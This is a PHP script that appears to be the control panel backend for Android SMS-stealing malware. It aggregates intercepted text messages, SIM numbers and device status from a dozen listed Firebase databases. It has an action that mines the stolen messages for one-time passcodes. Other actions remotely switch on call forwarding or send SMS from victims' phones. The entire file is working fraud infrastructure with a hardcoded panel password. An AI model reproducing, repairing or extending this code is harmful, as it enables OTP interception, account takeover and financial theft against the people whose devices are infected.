<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');

header('Content-Type: application/json; charset=utf-8');

if (!defined('JSON_PARTIAL_OUTPUT_ON_ERROR')) define('JSON_PARTIAL_OUTPUT_ON_ERROR', 0);
if (!defined('JSON_UNESCAPED_UNICODE')) define('JSON_UNESCAPED_UNICODE', 256);

define('PASSWORD', 'Alexa');

$FIREBASE_DBS = [
  'ADMIN_V5'   => 'https://pmsjdj-default-rtdb.firebaseio.com',
  'Bandhan'    => 'https://bandhan2-7jan-default-rtdb.firebaseio.com',
  'Darknet'    => 'https://darknet-26b68-default-rtdb.firebaseio.com',
  'Kumu'       => 'https://kumu-f2257-default-rtdb.firebaseio.com',
  'Maxa29'     => 'https://maxa29-f652e-default-rtdb.firebaseio.com',
  'Mera5'      => 'https://mera5-a7138-default-rtdb.firebaseio.com',
  'Mun4'       => 'https://mun4-ff5d4-default-rtdb.firebaseio.com',
  'Pawan'      => 'https://pawankumar92342038-8f702-default-rtdb.firebaseio.com',
  'Pohn'       => 'https://pohn-cd7ea-default-rtdb.firebaseio.com',
  'Randi_Rona' => 'https://randi-rona-81876-default-rtdb.firebaseio.com',
  'Rnd12'      => 'https://rnd12-17508-default-rtdb.firebaseio.com',
  'Ruparamee'  => 'https://ruparamee-14f4b-default-rtdb.firebaseio.com',
  'Sanjee'     => 'https://sanjee-9918a-default-rtdb.firebaseio.com',
];

// Default structure (used if DB not in overrides):
//   device_paths: [user_data, user_list, status, csc5 paths, clients]
//   sms_paths: [user_sms]
//   device_id: 'key' (device ID is the Firebase key)
//   status_type: 'keyed' (device ID is the key in status)
//   sms_sender: 'sender'
//   sms_body: 'body'
//   phone_fields: [phoneNumber, numberSim1, numberSim2, ...]
//   skip_auth_error: false

$DB_OVERRIDES = [
  'Bandhan' => [
    'device_paths' => ['status', 'clients'],
    'sms_paths' => ['smsNotifications'],
    'call_fwd_path' => 'callForwarding',
    'send_sms_path' => 'sendSms',
    'device_id' => 'field:uniqueid',
    'status_type' => 'push',
    'sms_sender' => 'senderNumber',
    'sms_body' => 'body',
    'phone_fields' => ['numberSim1','sim1Number','sim1','phoneNumber'],
    'has_sim_info' => true,
    'sim_info_path' => 'simInfo',
    'has_admin_phone' => true,
    'admin_phone_path' => 'admin',
    'skip_sms_device_id_check' => true,
  ],
  'Darknet' => [
    'skip' => true,  // permission denied on all paths
    'device_paths' => [],
    'sms_paths' => [],
  ],
  'Kumu' => [
    'phone_fields' => [],
  ],
  'Mun4' => [
    'phone_fields' => [],
  ],
  'Maxa29' => [
    'phone_fields' => ['phoneNumber','numberSim1','numberSim2','sim1','sim2'],
  ],
  'Mera5' => [
    'phone_fields' => ['numberSim1','numberSim2','sim1','sim2'],
  ],
  'Randi_Rona' => [
    'phone_fields' => ['numberSim1','numberSim2','sim1','sim2'],
  ],
  'Ruparamee' => [
    'phone_fields' => ['numberSim1','numberSim2','sim1','sim2'],
  ],
  'Rnd12' => [
    'phone_fields' => ['phoneNumber','numberSim1','numberSim2','sim1','sim2'],
    'has_access_path' => true,
  ],
  'Sanjee' => [
    'phone_fields' => ['phoneNumber','numberSim1','numberSim2','sim1','sim2'],
  ],
  'Pawan' => [
    'phone_fields' => ['phoneNumber','numberSim1','numberSim2','sim1','sim2'],
  ],
  'Pohn' => [
    'phone_fields' => ['phoneNumber','numberSim1','numberSim2','sim1','sim2'],
  ],
];

function dbPaths($name, $type = 'device') {
  global $FIREBASE_DBS, $DB_OVERRIDES;
  $base = $FIREBASE_DBS[$name] ?? null;
  if (!$base) return [];
  $over = $DB_OVERRIDES[$name] ?? [];

  if ($type === 'device') {
    $paths = $over['device_paths'] ?? ['user_data', 'user_list', 'status', 'user_sim', 'csc5/All_User/Info', 'csc5/All_User/SimINFO', 'clients'];
    $out = [];
    foreach ($paths as $p) $out["{$name}_" . str_replace(['/','.'],'_',$p)] = $base . '/' . $p . '.json';
    return $out;
  }

  if ($type === 'sms') {
    $paths = $over['sms_paths'] ?? ['user_sms', 'smsNotifications', 'messages', 'csc5/All_User/Sms', 'Sms'];
    $out = [];
    foreach ($paths as $i => $p) $out["{$name}_p{$i}"] = $base . '/' . $p . '.json';
    return $out;
  }

  return [];
}

function devId($data, $key, $name) {
  global $DB_OVERRIDES;
  $over = $DB_OVERRIDES[$name] ?? [];
  $mode = $over['device_id'] ?? 'key';
  if ($mode === 'key') return $key;
  if (strpos($mode, 'field:') === 0) {
    $field = substr($mode, 6);
    return $data[$field] ?? $key;
  }
  return $key;
}

function jsonout($d) {
  echo json_encode($d, JSON_PARTIAL_OUTPUT_ON_ERROR | JSON_UNESCAPED_UNICODE);
  exit;
}

function curlOpts($timeout, $conTimeout, $extra = []) {
  $opts = [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_CONNECTTIMEOUT => $conTimeout, CURLOPT_FOLLOWLOCATION => true, CURLOPT_SSL_VERIFYPEER => false];
  if (defined('CURLOPT_IPRESOLVE') && defined('CURL_IPRESOLVE_V4')) $opts[CURLOPT_IPRESOLVE] = CURL_IPRESOLVE_V4;
  foreach ($extra as $k => $v) $opts[$k] = $v;
  return $opts;
}

function fetchP($urls, $timeout = 12) {
  if (!$urls) return [];
  if (!function_exists('curl_init')) return [];
  if (function_exists('curl_multi_init')) {
    $mh = curl_multi_init(); $chs = []; $res = [];
    foreach ($urls as $k => $u) {
      $ch = curl_init($u);
      curl_setopt_array($ch, curlOpts($timeout, 4));
      curl_multi_add_handle($mh, $ch); $chs[$k] = $ch;
    }
    $r = null;
    do { curl_multi_exec($mh, $r); curl_multi_select($mh, 1); } while ($r > 0);
    foreach ($chs as $k => $ch) { $d = curl_multi_getcontent($ch); $res[$k] = ($d !== false && $d !== '') ? json_decode($d, true) : null; curl_multi_remove_handle($mh, $ch); curl_close($ch); }
    curl_multi_close($mh);
    return $res;
  }
  $res = [];
  foreach ($urls as $k => $u) {
    $ch = curl_init($u);
    curl_setopt_array($ch, curlOpts(min(4, $timeout), 3));
    $d = curl_exec($ch); curl_close($ch);
    $res[$k] = ($d !== false && $d !== '') ? json_decode($d, true) : null;
  }
  return $res;
}

function nv($v) {
  $na = ['Not Available', 'No Data', 'No SIM Found', 'Unknown', '', '-', 'Restricted'];
  return ($v && !in_array($v, $na, true)) ? $v : '';
}

function phones($d, $name = '') {
  global $DB_OVERRIDES;
  $over = $DB_OVERRIDES[$name] ?? [];
  $f = $over['phone_fields'] ?? ['phoneNumber','number','numberSim1','numberSim2','sim1','sim2','PhoneNumber','phone','mobile','number1','simNumber','mobNo','sim','mobileNumber','contactNumber','tel','cell','phoneNo','sim1Number'];
  foreach ($f as $k) { $v = nv($d[$k] ?? ''); if ($v) return $v; }
  return '';
}

function simName($d) {
  $f = ['nameSim1','nameSim2','name1','sim1Name','operator1','operator2','simName','simOperator','nameSim','sim_operator','carrierName','operator','carrier','network','spn','sim1Carrier','sim2Carrier'];
  foreach ($f as $k) { $v = nv($d[$k] ?? ''); if ($v) return $v; }
  return '';
}

function simNumbers($d, $name = '') {
  $nums = [];
  $n1 = nv($d['numberSim1'] ?? '') ?: nv($d['sim1'] ?? '') ?: nv($d['number1'] ?? '') ?: phones($d, $name);
  $n2 = nv($d['numberSim2'] ?? '') ?: nv($d['sim2'] ?? '') ?: nv($d['number2'] ?? '');
  if ($n1) $nums[] = $n1;
  if ($n2 && $n2 !== $n1) $nums[] = $n2;
  return $nums;
}

function normSms(&$v, $name) {
  global $DB_OVERRIDES;
  $over = $DB_OVERRIDES[$name] ?? [];
  $sf = $over['sms_sender'] ?? 'sender';
  $bf = $over['sms_body'] ?? 'body';
  $s = $v[$sf] ?? $v['sender'] ?? $v['senderNumber'] ?? $v['ph'] ?? $v['receiverNumber'] ?? $v['from'] ?? $v['address'] ?? '';
  $b = $v[$bf] ?? $v['msg'] ?? $v['message'] ?? $v['text'] ?? $v['content'] ?? '';
  $v['sender'] = nv($s) ?: '';
  $v['body'] = nv($b) ?: '';
  if (empty($v['sender']) && !empty($v['receiverNumber'])) $v['sender'] = $v['receiverNumber'];
  if (empty($v['sender']) && !empty($v['from'])) $v['sender'] = $v['from'];
  if (empty($v['sender']) && !empty($v['address'])) $v['sender'] = $v['address'];
  if (!empty($v['senderNumber']) && empty($v['sender'])) $v['sender'] = $v['senderNumber'];
  if (!empty($v['senderNumber']) && !is_numeric(preg_replace('/[^0-9]/','',$v['sender']))) $v['sender'] = $v['senderNumber'];
}

function extOtp($t) {
  if (preg_match('/(?:OTP|code|verif|login|one.?time|otp)\s*(?::|is)?\s*(\d{4,8})/i', $t, $m)) return $m[1];
  if (preg_match('/\b(\d{4,8})\b/', $t, $m)) return $m[1];
  return null;
}

function isError($data) {
  return is_array($data) && isset($data['error']) && is_string($data['error']);
}

// ====== AUTH ======
$action = $_GET['action'] ?? '';
$pwd = $_GET['pwd'] ?? $_POST['pwd'] ?? '';
if ($pwd !== PASSWORD) {
  if ($action === 'login') jsonout(['ok' => ($_POST['password'] ?? '') === PASSWORD]);
  http_response_code(401);
  jsonout(['error' => 'Unauthorized']);
}

// ====== HELPERS ======
function mergeSims(&$d, $data, $name) {
  if (!$data || !is_array($data)) return;
  foreach ($data as $uuid => $c) {
    if (!$c || !is_array($c) || isError($c)) continue;
    $did = $c['deviceId'] ?? '';
    $mn = $c['mobNo'] ?? '';
    if ($did && $did === ($d['_id'] ?? '')) { mergeCl($d, $c, $uuid); return; }
    if ($mn && $mn === phones($d, $name)) { mergeCl($d, $c, $uuid); return; }
  }
}

function mergeCl(&$d, $c, $uuid) {
  $d['_cl'] = $uuid;
  if (!empty($c['sims']) && is_array($c['sims'])) {
    foreach ($c['sims'] as $s) {
      if (!is_array($s)) continue;
      $slot = $s['simSlotIndex'] ?? '';
      $car = $s['carrierName'] ?? '';
      $ph = $s['phoneNumber'] ?? '';
      if ($slot === '0' || $slot === 0 || $slot === '') {
        if ($car && empty($d['nameSim1'])) $d['nameSim1'] = $car;
        if ($ph && empty($d['numberSim1'])) $d['numberSim1'] = $ph;
      } elseif ($slot === '1' || $slot === 1) {
        if ($car && empty($d['nameSim2'])) $d['nameSim2'] = $car;
        if ($ph && empty($d['numberSim2'])) $d['numberSim2'] = $ph;
      }
    }
  }
  if (empty($d['battery']) && isset($c['battery'])) $d['battery'] = $c['battery'];
  if (empty($d['d_name']) && !empty($c['modelName'])) $d['d_name'] = $c['modelName'];
  if (empty($d['phoneNumber']) && !empty($c['mobNo'])) $d['phoneNumber'] = $c['mobNo'];
}

// ====== ACTION: ping ======
if ($action === 'ping') {
  $checks = ['curl' => function_exists('curl_init'), 'curl_multi' => function_exists('curl_multi_init'), 'json' => function_exists('json_encode'), 'ob' => function_exists('ob_clean')];
  jsonout(['ok' => true, 'checks' => $checks, 'php' => PHP_VERSION, 'dbs' => count($FIREBASE_DBS)]);
}

// ====== ACTION: login ======
if ($action === 'login') jsonout(['ok' => ($_POST['password'] ?? '') === PASSWORD]);

// ====== ACTION: sync ======
if ($action === 'sync') {
  $all = []; $idx = [];
  $urls = []; $urlMeta = [];

  foreach ($FIREBASE_DBS as $name => $base) {
    $over = $DB_OVERRIDES[$name] ?? [];
    if (!empty($over['skip'])) continue;
    foreach (dbPaths($name, 'device') as $fullKey => $u) {
      $uid = 'u' . count($urlMeta);
      $urls[$uid] = $u;
      $prefix = $name . '_';
      $pathType = (strpos($fullKey, $prefix) === 0) ? substr($fullKey, strlen($prefix)) : $fullKey;
      $urlMeta[$uid] = ['name' => $name, 'type' => $pathType];
    }
  }
  $res = fetchP($urls, 12);

  foreach ($res as $uid => $data) {
    if ($data === null || isError($data)) continue;
    $meta = $urlMeta[$uid] ?? null;
    if (!$meta) continue;
    $name = $meta['name'];
    $rawType = $meta['type'];
    $over = $DB_OVERRIDES[$name] ?? [];
    $st = $over['status_type'] ?? 'keyed';

    // Normalize path type
    $type = $rawType;
    if (strpos($rawType, 'SimINFO') !== false) $type = 'SimINFO';
    elseif (strpos($rawType, 'Info') !== false) $type = 'Info';
    elseif (strpos($rawType, 'user_sim') !== false) $type = 'user_sim';

    if (in_array($type, ['user_data','user_list','Info'])) {
      if (!is_array($data)) continue;
      foreach ($data as $id => $v) {
        if ($v && is_array($v) && !array_key_exists(0, $v)) {
          $did = devId($v, $id, $name);
          $v['_db'] = $name; $v['_id'] = $did;
          if ($type === 'Info') $v['_csc5'] = true;
          if (!isset($all[$did])) { $all[$did] = $v; $idx[$did] = $name; }
        }
      }
    } elseif ($type === 'status') {
      if (!is_array($data)) continue;
      foreach ($data as $uid => $v) {
        if ($v && is_array($v)) {
          $did = $st === 'push' ? ($v['uniqueid'] ?? $uid) : $uid;
          if (!isset($all[$did])) {
            $all[$did] = ['d_name' => 'Device', 'status' => !empty($v['online']) ? 'online' : 'offline', 'timestamp' => $v['timestamp'] ?? 0, '_db' => $name, '_id' => $did];
            $idx[$did] = $name;
          } else {
            if (empty($all[$did]['status'])) $all[$did]['status'] = !empty($v['online']) ? 'online' : 'offline';
            if (empty($all[$did]['timestamp']) && !empty($v['timestamp'])) $all[$did]['timestamp'] = $v['timestamp'];
          }
        }
      }
    } elseif (in_array($type, ['user_sim','SimINFO'])) {
      if (!is_array($data)) continue;
      foreach ($data as $did => $v) {
        if (!isset($all[$did]) || !$v || !is_array($v)) continue;
        foreach (['sim1','sim2','simNumber','numberSim1','numberSim2','sim1Number','sim2Number'] as $f) {
          if (!empty($v[$f]) && empty($all[$did]['numberSim1'])) $all[$did]['numberSim1'] = $v[$f];
          if (!empty($v[$f]) && !empty($all[$did]['numberSim1']) && $v[$f] !== $all[$did]['numberSim1'] && empty($all[$did]['numberSim2'])) $all[$did]['numberSim2'] = $v[$f];
        }
        foreach (['sim1','sim2','name','simName','sim1Name','sim2Name','nameSim1','nameSim2','operator','operator1','operator2','simOperator','sim_operator','carrierName','sim1Carrier','sim2Carrier'] as $f) {
          if (!empty($v[$f]) && empty($all[$did]['nameSim1'])) $all[$did]['nameSim1'] = $v[$f];
        }
      }
    } elseif ($type === 'clients') {
      if (!is_array($data)) continue;
      foreach ($data as $uuid => $c) {
        if (!$c || !is_array($c) || isError($c)) continue;
        $did = $c['deviceId'] ?? '';
        $mn = $c['mobNo'] ?? '';
        if ($did && isset($all[$did])) { mergeCl($all[$did], $c, $uuid); continue; }
        if ($mn) {
          foreach ($all as $aid => &$d) {
            if (phones($d, $name) === $mn) { mergeCl($d, $c, $uuid); break; }
          }
          unset($d);
        }
      }
    }
  }

  // Enrich Bandhan devices with simInfo
  foreach ($FIREBASE_DBS as $name => $base) {
    $over = $DB_OVERRIDES[$name] ?? [];
    if (empty($over['has_sim_info'])) continue;
    $simUrl = $base . '/' . ($over['sim_info_path'] ?? 'simInfo') . '.json';
    $simData = fetchP(['sim' => $simUrl], 6);
    $simData = $simData['sim'] ?? null;
    if (!$simData || !is_array($simData)) continue;
    foreach ($simData as $uuid => $si) {
      if (!$si || !is_array($si)) continue;
      $did = $si['uniqueid'] ?? '';
      if (!$did || !isset($all[$did])) continue;
      if (!empty($si['sim1Number']) && empty($all[$did]['numberSim1'])) $all[$did]['numberSim1'] = nv($si['sim1Number']);
      if (!empty($si['sim2Number']) && empty($all[$did]['numberSim2'])) $all[$did]['numberSim2'] = nv($si['sim2Number']);
      if (!empty($si['sim1Carrier']) && empty($all[$did]['nameSim1'])) $all[$did]['nameSim1'] = $si['sim1Carrier'];
      if (!empty($si['sim2Carrier']) && empty($all[$did]['nameSim2'])) $all[$did]['nameSim2'] = $si['sim2Carrier'];
    }
  }

  // Enrich Bandhan with admin phone number
  foreach ($FIREBASE_DBS as $name => $base) {
    $over = $DB_OVERRIDES[$name] ?? [];
    if (empty($over['has_admin_phone'])) continue;
    $admUrl = $base . '/' . ($over['admin_phone_path'] ?? 'admin') . '.json';
    $admData = fetchP(['adm' => $admUrl], 6);
    $admData = $admData['adm'] ?? null;
    if (!$admData || !is_array($admData)) continue;
    $adminPhone = $admData['phoneNumber'] ?? '';
    if ($adminPhone) {
      // Assign admin phone to any device that has no known phone
      foreach ($all as $aid => &$d) {
        if ($d['_db'] === $name && empty(phones($d, $name))) {
          $d['phoneNumber'] = $adminPhone;
        }
      }
      unset($d);
    }
  }

  // Fill phone/sim fallbacks
  foreach ($all as $id => &$d) {
    $dbName = $d['_db'] ?? '';
    $ph = phones($d, $dbName);
    $sn = simName($d);
    if ($ph && empty($d['numberSim1'])) $d['numberSim1'] = $ph;
    if ($sn && empty($d['nameSim1'])) $d['nameSim1'] = $sn;
    if (!empty($d['ussd_response'])) {
      $r = strtolower($d['ussd_response']);
      if (strpos($r, 'successful') !== false || strpos($r, 'registration') !== false) $d['_fwd'] = 'Activate';
      elseif (strpos($r, 'fail') !== false) $d['_fwd'] = 'Deactivate';
    }
    if (!empty($d['ussd_code']) && strpos($d['ussd_code'], '**21*') !== false && empty($d['_fwd'])) $d['_fwd'] = 'Activate';
  }
  unset($d);

  jsonout(['devices' => $all, 'index' => $idx]);
}

// ====== ACTION: sms (single device) ======
if ($action === 'sms') {
  $did = $_GET['id'] ?? ''; $db = $_GET['db'] ?? '';
  if (!$did || !$db) jsonout([]);
  $over = $DB_OVERRIDES[$db] ?? [];
  if (!empty($over['skip'])) jsonout([]);
  $urls = dbPaths($db, 'sms');
  $res = fetchP($urls, 8);
  $sms = [];
  foreach ($res as $data) {
    if (!$data || !is_array($data) || isError($data)) continue;
    $dd = $data[$did] ?? null;
    if (!$dd || !is_array($dd)) continue;
    if (!empty($dd['body']) || !empty($dd['msg']) || !empty($dd['message'])) {
      $dd['body'] = $dd['body'] ?? $dd['msg'] ?? $dd['message'];
      normSms($dd, $db);
      $sms[] = $dd;
    } else {
      foreach ($dd as $k => $v) {
        if ($v && is_array($v) && (!empty($v['body']) || !empty($v['msg']) || !empty($v['message']))) {
          $v['body'] = $v['body'] ?? $v['msg'] ?? $v['message'];
          normSms($v, $db);
          $v['_id'] = $k;
          $sms[] = $v;
        }
      }
    }
  }
  jsonout($sms);
}

function fetchDbSms($name) {
  global $DB_OVERRIDES;
  $over = $DB_OVERRIDES[$name] ?? [];
  if (!empty($over['skip'])) return [];
  $paths = dbPaths($name, 'sms');
  if (!$paths) return [];
  $res = fetchP($paths, 20);
  $out = [];
  foreach ($res as $data) {
    if (!$data || !is_array($data) || isError($data)) continue;
    foreach ($data as $did => $msgs) {
      if (!$msgs || !is_array($msgs)) continue;
      foreach ($msgs as $k => $v) {
        if ($v && is_array($v)) {
          normSms($v, $name);
          if ($v['body']) {
            $v['_dev'] = $did;
            $v['_db'] = $name;
            $out[] = $v;
          }
        }
      }
    }
  }
  return $out;
}

// ====== ACTION: all_sms ======
if ($action === 'all_sms') {
  @set_time_limit(0);
  $dbF = $_GET['db'] ?? '';
  $names = $dbF ? [$dbF] : array_keys($FIREBASE_DBS);
  $all = [];
  foreach ($names as $name) { $sms = fetchDbSms($name); foreach ($sms as $s) $all[] = $s; }
  jsonout($all);
}

// ====== ACTION: all_otp ======
if ($action === 'all_otp') {
  @set_time_limit(0);
  $dbF = $_GET['db'] ?? '';
  $names = $dbF ? [$dbF] : array_keys($FIREBASE_DBS);
  $otps = [];
  foreach ($names as $name) {
    $sms = fetchDbSms($name);
    foreach ($sms as $v) {
      $otp = extOtp($v['body']);
      if ($otp) { $v['_otp'] = $otp; $otps[] = $v; }
    }
  }
  jsonout($otps);
}

// ====== ACTION: call_fwd ======
if ($action === 'call_fwd') {
  $id = $_GET['id'] ?? ''; $db = $_GET['db'] ?? ''; $ph = $_POST['phone'] ?? ''; $st = $_POST['status'] ?? '';
  if (!$id || !$db) jsonout(['ok' => false]);
  $b = $FIREBASE_DBS[$db] ?? null;
  if (!$b) jsonout(['ok' => false]);
  $over = $DB_OVERRIDES[$db] ?? [];
  $cfPath = $over['call_fwd_path'] ?? 'call_forwarding';
  $fsPath = 'Forward_Status';

  $p1 = ['All_User' => [$id => ['PhoneNumber' => $ph, 'Status' => $st, 'Type' => 'Unconditional']]];
  $p2 = ['All_User' => [$id => ['status' => $st === 'Activate' ? 'Yes' : 'No']]];
  if (function_exists('curl_multi_init')) {
    $mh = curl_multi_init();
    foreach ([$b.'/'.$cfPath.'.json', $b.'/'.$fsPath.'.json'] as $i => $u) {
      $pl = $i === 0 ? $p1 : $p2; $j = json_encode($pl);
      $ch = curl_init($u); curl_setopt_array($ch, curlOpts(8, 4, [CURLOPT_CUSTOMREQUEST => 'PATCH', CURLOPT_POSTFIELDS => $j, CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Content-Length: '.strlen($j)]]));
      curl_multi_add_handle($mh, $ch);
    }
    $r = null; do { curl_multi_exec($mh, $r); curl_multi_select($mh, 1); } while ($r > 0);
    curl_multi_close($mh);
    jsonout(['ok' => true]);
  }
  jsonout(['ok' => false]);
}

// ====== ACTION: send_sms ======
if ($action === 'send_sms') {
  $id = $_GET['id'] ?? ''; $db = $_GET['db'] ?? ''; $to = $_POST['to'] ?? ''; $body = $_POST['body'] ?? ''; $from = $_POST['from'] ?? 'SIM 1';
  if (!$id || !$db || !$to || !$body) jsonout(['ok' => false]);
  $b = $FIREBASE_DBS[$db] ?? null;
  if (!$b) jsonout(['ok' => false]);
  $over = $DB_OVERRIDES[$db] ?? [];
  $ssPath = $over['send_sms_path'] ?? 'clients';
  $uuid = 'cmd_'.time().'_'.rand(100,999);

  if ($ssPath === 'sendSms') {
    $pl = [$uuid => ['address' => $to, 'message' => $body, 'sim' => $from === 'SIM 1' ? '1' : '2', 'timestamp' => round(microtime(true) * 1000)]];
  } else {
    $pl = [$uuid => ['webhookEvent' => ['sendSms' => ['from' => $from, 'to' => $to, 'message' => $body, 'isSended' => false]]]];
  }
  $j = json_encode($pl);
  $ch = curl_init($b.'/'.$ssPath.'.json');
  curl_setopt_array($ch, curlOpts(8, 4, [CURLOPT_CUSTOMREQUEST => 'PATCH', CURLOPT_POSTFIELDS => $j, CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Content-Length: '.strlen($j)]]));
  curl_exec($ch); curl_close($ch);
  jsonout(['ok' => true]);
}

jsonout(['error' => 'Unknown action']);
